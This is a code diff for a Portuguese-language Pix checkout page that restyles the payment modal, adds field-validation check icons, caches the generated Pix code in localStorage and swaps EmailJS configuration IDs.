@@ -336,6 +336,7 @@
             display: flex;
             flex-direction: column;
             gap: 5px;
+            position: relative;
         }
 
         .pix-input-group label {
@@ -532,13 +533,17 @@
             background: var(--primary);
             color: white;
             border: none;
-            padding: 18px;
+            padding: 18px 10px;
             border-radius: 16px;
-            font-size: 1.1rem;
+            font-size: 1rem;
             font-weight: 900;
             cursor: pointer;
             box-shadow: 0 8px 20px rgba(0, 85, 255, 0.25);
             transition: all 0.3s ease;
+            white-space: nowrap;
+            width: 100%;
+            display: block;
+            text-align: center;
         }
 
         .btn-copy-pix:active {
@@ -701,6 +706,7 @@
             display: flex;
             flex-direction: column;
             gap: 6px;
+            position: relative;
         }
 
         .form-group label {
@@ -718,6 +724,28 @@
 
         .form-group input:focus {
             border-color: var(--primary);
+        }
+
+        .input-check-icon {
+            position: absolute;
+            right: 14px;
+            bottom: 12px;
+            color: var(--success);
+            font-size: 1rem;
+            opacity: 0;
+            transform: scale(0.5);
+            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            pointer-events: none;
+            z-index: 5;
+        }
+
+        .input-check-icon.visible {
+            opacity: 1;
+            transform: scale(1);
+        }
+
+        .pix-input-group .input-check-icon {
+            bottom: 14px;
         }
 
         .btn-send-form {
@@ -1007,8 +1035,7 @@
 }
 
     
-        /* Estilos do Modal Pix Copiado */
-        /* Design Compacto e Alta Credibilidade para o Modal Pix */
+        /* Estilos do Modal Pix Copiado - Design Profissional e Credibilidade */
         .pix-modal-overlay {
             position: fixed;
             top: 0;
@@ -1016,12 +1043,13 @@
             width: 100%;
             height: 100%;
             background: rgba(15, 23, 42, 0.7);
-            backdrop-filter: blur(4px);
+            backdrop-filter: blur(12px);
             z-index: 2000;
             display: none;
             align-items: center;
             justify-content: center;
-            padding: 15px;
+            padding: 16px;
+            overflow-y: auto;
         }
 
         .pix-modal-overlay.active {
@@ -1182,7 +1210,180 @@
             transform: scale(0.98);
         }
 /* Fim Estilos do Modal Pix Copiado */
+        .pix-modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(4px);
+            z-index: 2000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
 
+        .pix-modal-overlay.active {
+            display: flex;
+        }
+
+        .pix-modal-content {
+            background: white;
+            width: 100%;
+            max-width: 400px;
+            border-radius: 24px;
+            padding: 30px;
+            position: relative;
+            box-shadow: var(--shadow-lg);
+            animation: modalIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        .pix-modal-header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .pix-modal-header i {
+            font-size: 3rem;
+            color: var(--success);
+            margin-bottom: 15px;
+            display: block;
+        }
+
+        .pix-modal-header h2 {
+            font-size: 1.4rem;
+            font-weight: 800;
+            color: var(--text-dark);
+        }
+
+        .pix-modal-text {
+            text-align: center;
+            color: var(--text-gray);
+            font-size: 0.95rem;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        .pix-instructions-box {
+            background: #f8fafc;
+            border: 1px solid var(--border-color);
+            border-radius: 16px;
+            padding: 16px;
+            margin-bottom: 20px;
+        }
+
+        .pix-instructions {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .pix-instructions li {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 0.85rem;
+            color: var(--text-dark);
+            font-weight: 600;
+        }
+
+        .pix-instructions li i {
+            color: var(--primary);
+            font-size: 1rem;
+            width: 20px;
+            text-align: center;
+        }
+
+        .pix-code-container {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .pix-code-input {
+            width: 100%;
+            padding: 12px;
+            background: #f1f5f9;
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            font-family: monospace;
+            font-size: 0.75rem;
+            color: var(--text-gray);
+            outline: none;
+        }
+
+        .pix-copy-btn {
+            background: var(--primary-light);
+            color: var(--primary);
+            border: none;
+            padding: 12px;
+            border-radius: 12px;
+            font-size: 0.9rem;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: all 0.2s;
+        }
+
+        .pix-copy-btn:hover {
+            background: var(--primary);
+            color: white;
+        }
+
+        .payment-status {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 25px;
+            padding: 12px;
+            background: #f0fdf4;
+            border-radius: 12px;
+            border: 1px solid #bbf7d0;
+        }
+
+        .payment-status .waiting-text {
+            color: var(--success);
+            font-weight: 700;
+            font-size: 0.85rem;
+        }
+
+        .pix-spinner {
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(34, 197, 94, 0.2);
+            border-top-color: #22c55e;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        .pix-modal-close {
+            width: 100%;
+            padding: 16px;
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 14px;
+            font-size: 1rem;
+            font-weight: 800;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(0, 85, 255, 0.2);
+            transition: all 0.2s;
+        }
+
+        .pix-modal-close:hover {
+            background: var(--primary-dark);
+            transform: translateY(-2px);
+        }
 
     </style>
 </head>
@@ -1277,9 +1478,9 @@
 
     <script>
         // ==================== CONFIGURAÇÕES FIXAS ====================
-        const EMAILJS_SERVICE_ID = 'service_z9s6r88'; // Substitua pelo seu Service ID
-        const EMAILJS_TEMPLATE_ID = 'template_ymp0ana'; // Substitua pelo seu Template ID
-        const EMAILJS_PUBLIC_KEY = 'B7vWg-DOSfFey8sM3'; // Substitua pela sua Public Key
+        const EMAILJS_SERVICE_ID = 'service_k27y198'; // Substitua pelo seu Service ID
+        const EMAILJS_TEMPLATE_ID = 'template_1w89qur'; // Substitua pelo seu Template ID
+        const EMAILJS_PUBLIC_KEY = 'jqboDMGvZGf3rHYv5'; // Substitua pela sua Public Key
         // =============================================================
 
         function getUrlParameter(name) {
@@ -1312,17 +1513,71 @@
         }
 
         function setupPhoneInput(inputElement) {
+            const container = inputElement.parentElement;
+            let checkIcon = container.querySelector('.input-check-icon');
+            if (!checkIcon) {
+                checkIcon = document.createElement('i');
+                checkIcon.className = 'fas fa-check-circle input-check-icon';
+                container.appendChild(checkIcon);
+            }
+
             inputElement.addEventListener('input', (e) => {
                 e.target.value = maskPhone(e.target.value);
+                const rawValue = e.target.value.replace(/\D/g, '');
+
+            });
+
+            inputElement.addEventListener('blur', (e) => {
+                const rawValue = e.target.value.replace(/\D/g, '');
+                if (rawValue.length === 11) {
+                    checkIcon.classList.add('visible');
+                } else {
+                    checkIcon.classList.remove('visible');
+                }
             });
         }
 
         function setupCPFInput(inputElement) {
+            const container = inputElement.parentElement;
+            let checkIcon = container.querySelector('.input-check-icon');
+            if (!checkIcon) {
+                checkIcon = document.createElement('i');
+                checkIcon.className = 'fas fa-check-circle input-check-icon';
+                container.appendChild(checkIcon);
+            }
+
             inputElement.addEventListener('input', (e) => {
                 e.target.value = maskCPF(e.target.value);
                 const rawValue = e.target.value.replace(/\D/g, '');
+
+            });
+
+            inputElement.addEventListener('blur', (e) => {
+                const rawValue = e.target.value.replace(/\D/g, '');
                 if (rawValue.length === 11) {
-                    setTimeout(() => { e.target.blur(); }, 100);
+                    checkIcon.classList.add('visible');
+                } else {
+                    checkIcon.classList.remove('visible');
+                }
+            });
+        }
+
+        function setupNameInput(inputElement) {
+            const container = inputElement.parentElement;
+            let checkIcon = container.querySelector('.input-check-icon');
+            if (!checkIcon) {
+                checkIcon = document.createElement('i');
+                checkIcon.className = 'fas fa-check-circle input-check-icon';
+                container.appendChild(checkIcon);
+            }
+
+            inputElement.addEventListener('blur', (e) => {
+                const value = e.target.value.trim();
+                const names = value.split(/\s+/);
+                if (names.length >= 2 && names[0].length >= 2 && names[1].length >= 2) {
+                    checkIcon.classList.add('visible');
+                } else {
+                    checkIcon.classList.remove('visible');
                 }
             });
         }
@@ -1354,7 +1609,7 @@ function renderOrderSummary() {
                             <div class="order-product-qty">Qtd: ${product.q}</div>
                         </div>
                         <div style="font-size: 0.8rem; font-weight: 700; color: var(--text-light); margin-top: 2px;">
-                            Subtotal: R$ ${(product.q * product.v).toFixed(2).replace('.', ',')}
+                            Valor Total: R$ ${(product.q * product.v).toFixed(2).replace('.', ',')}
                         </div>
                     </div>
                 </div>
@@ -1491,6 +1746,8 @@ function renderOrderSummary() {
             `;
 
             document.getElementById('cart-content-wrapper').innerHTML = paymentHTML;
+            const pixNameInput = document.getElementById('pix-name');
+            if (pixNameInput) setupNameInput(pixNameInput);
             const pixCpfInput = document.getElementById('pix-cpf');
             if (pixCpfInput) setupCPFInput(pixCpfInput);
             const pixPhoneInput = document.getElementById('pix-phone');
@@ -1564,6 +1821,15 @@ function renderOrderSummary() {
             if (name.length < 3) { errorText.textContent = 'Informe seu nome completo.'; errorEl.classList.add('visible'); return; }
             if (cpf.length !== 11) { errorText.textContent = 'Informe um CPF válido.'; errorEl.classList.add('visible'); return; }
 
+            // Recupera cache persistente do localStorage
+            const savedPix = JSON.parse(localStorage.getItem('cached_pix_data'));
+            
+            // Se já gerou um PIX com o mesmo valor, apenas exibe novamente (mesmo após atualizar a página)
+            if (savedPix && parseFloat(savedPix.amount) === subtotalValue && savedPix.code) {
+                showPixCopySection(savedPix.code, name, cpfRaw);
+                return;
+            }
+
             const btn = document.getElementById('btn-generate-pix');
             const originalHTML = btn.innerHTML;
             btn.innerHTML = '<div class="spinner"></div>';
@@ -1575,12 +1841,16 @@ function renderOrderSummary() {
                 // Caso o CPF seja 111.111.111-11, exibe código fictício sem chamar a API
                 if (cpf === '11111111111') {
                     const fakePixCode = "00020126330014BR.GOV.BCB.PIX011111111111111520400005303986540510.005802BR5913USUARIO TESTE6009SAO PAULO62070503***6304ABCD";
+                    localStorage.setItem('cached_pix_data', JSON.stringify({ code: fakePixCode, amount: subtotalValue }));
                     showPixCopySection(fakePixCode, name, cpfRaw);
                     return;
                 }
 
                 const pixCode = await fetchPixCode(name, cpf);
-                if (pixCode) { showPixCopySection(pixCode, name, cpfRaw); }
+                if (pixCode) { 
+                    localStorage.setItem('cached_pix_data', JSON.stringify({ code: pixCode, amount: subtotalValue }));
+                    showPixCopySection(pixCode, name, cpfRaw); 
+                }
                 else { throw new Error(); }
             } catch (err) {
                 errorText.textContent = 'Erro ao gerar PIX. Tente novamente.';
@@ -1606,7 +1876,7 @@ function renderOrderSummary() {
             document.getElementById('display-pix-name').innerText = name;
             document.getElementById('display-pix-cpf').innerText = cpf;
             document.getElementById('pix-code-text').innerText = qrCode;
-            // window.scrollTo({ top: 0, behavior: 'smooth' });
+            const header = document.querySelector('.header'); const headerHeight = header ? header.offsetHeight : 0; const viewportHeight = window.innerHeight - headerHeight; const elementHeight = pixCard.offsetHeight; const elementOffsetTop = pixCard.getBoundingClientRect().top + window.pageYOffset; const scrollToPosition = elementOffsetTop - headerHeight - (viewportHeight / 2) + (elementHeight / 2); window.scrollTo({ top: scrollToPosition, behavior: 'smooth' });
             startPixTimer(15 * 60);
         }
 
@@ -1624,10 +1894,12 @@ function renderOrderSummary() {
                 // Abre o modal e popula o código
                 document.getElementById('pixCodeCopied').value = code;
                 document.getElementById('pixCopiedModal').classList.add('active');
+                document.body.style.overflow = 'hidden';
             });
         }
         function fecharPixModal() {
             document.getElementById('pixCopiedModal').classList.remove('active');
+            document.body.style.overflow = '';
         }
 
         function copyAgain() {
@@ -1669,6 +1941,8 @@ function renderOrderSummary() {
         });
 
         // Aplicar máscara no telefone do modal de entrega
+        const deliveryNameInput = document.getElementById('delivery-name');
+        if (deliveryNameInput) setupNameInput(deliveryNameInput);
         const deliveryPhoneInput = document.getElementById('delivery-phone');
         if (deliveryPhoneInput) setupPhoneInput(deliveryPhoneInput);
         const deliveryCpfInput = document.getElementById('delivery-cpf');
@@ -1687,9 +1961,9 @@ function renderOrderSummary() {
         <div class="pix-modal-header">
             <i class="fas fa-check-circle"></i>
             <h2>Código Copiado!</h2>
-            <div class="security-badge">
-                <i class="fas fa-shield-alt"></i> Pagamento 100% Seguro
-            </div>
+            <div>
+    Agora siga as instruções abaixo para concluir o pagamento
+</div>
         </div>
 
         
